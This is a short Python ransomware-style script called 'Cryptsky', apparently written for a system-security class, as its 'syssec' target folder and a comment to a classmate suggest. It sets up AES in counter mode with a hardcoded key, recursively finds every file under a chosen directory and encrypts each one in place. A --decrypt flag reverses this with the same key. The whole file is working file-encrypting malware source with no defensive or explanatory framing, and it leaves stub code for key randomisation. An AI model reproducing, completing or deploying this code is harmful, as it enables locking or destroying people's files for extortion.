from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discover
import modify
HARDCODED_KEY = 'saveusfrompsgpls'


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        key = 'saveusfrompsgpls'

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    startdirs = ['/Users/mercifulrookie/Desktop/syssec']
    #PUT YOURS PRAVIN, I USED /NARAYANAA

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)

    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        pass

if __name__=="__main__":
    main()
